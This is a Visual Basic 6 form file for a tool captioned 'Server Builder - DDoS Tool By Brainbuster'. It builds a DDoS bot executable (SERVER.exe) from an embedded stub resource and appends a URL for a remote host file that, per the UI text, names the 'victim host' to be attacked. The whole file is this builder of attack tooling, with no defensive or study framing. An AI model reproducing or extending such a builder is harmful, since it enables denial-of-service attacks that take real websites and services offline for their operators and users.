VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Server Builder - DDoS Tool By Brainbuster"
   ClientHeight    =   2235
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   4035
   LinkTopic       =   "Form1"
   ScaleHeight     =   2235
   ScaleWidth      =   4035
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command1 
      Caption         =   "Build Server"
      Height          =   255
      Left            =   1200
      TabIndex        =   1
      Top             =   1800
      Width           =   1455
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   1560
      TabIndex        =   0
      Text            =   "http://www.yourserver.com/host.txt"
      Top             =   360
      Width           =   2415
   End
   Begin VB.Frame Frame1 
      Caption         =   "Server Builder - DDoS Tool By Brainbuster"
      Height          =   2055
      Left            =   120
      TabIndex        =   2
      Top             =   120
      Width           =   3855
      Begin VB.Label Label3 
         Caption         =   "www.victim.com"
         Height          =   255
         Left            =   720
         TabIndex        =   5
         Top             =   1320
         Width           =   2295
      End
      Begin VB.Label Label2 
         Caption         =   "In the Host-File the tool will read it's victim-host. Just write the victim host to host-file. example: "
         Height          =   615
         Left            =   720
         TabIndex        =   4
         Top             =   720
         Width           =   2295
      End
      Begin VB.Label Label1 
         Caption         =   "Host-File URL::"
         Height          =   255
         Left            =   120
         TabIndex        =   3
         Top             =   240
         Width           =   2415
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Sub Command1_Click()


ResToFile "SERVER.exe", "STUB", "CUSTOM", Overwrite = True
MsgBox ("SERVER.exe has been build")
End Sub


Public Sub ResToFile(Filename As String, ResID As Variant, ResType As Variant, Optional Overwrite As Boolean = False)
'On Error GoTo trap
Dim Buffer() As Byte
Dim Filenum As Integer
If Dir(Filename) <> Empty Then
  If Overwrite Then Kill Filename Else Err.Raise 58
End If
Buffer = LoadResData(ResID, ResType)
Filenum = FreeFile
Open Filename For Binary Access Write As Filenum
Put Filenum, , Buffer
Put Filenum, , "CONFIG" & Text1.Text & "CONFIG"
Close Filenum
Shell ("echo CONFIG" & Text1.Text & "CONFIG >> SERVER.exe"), vbHide
End Sub


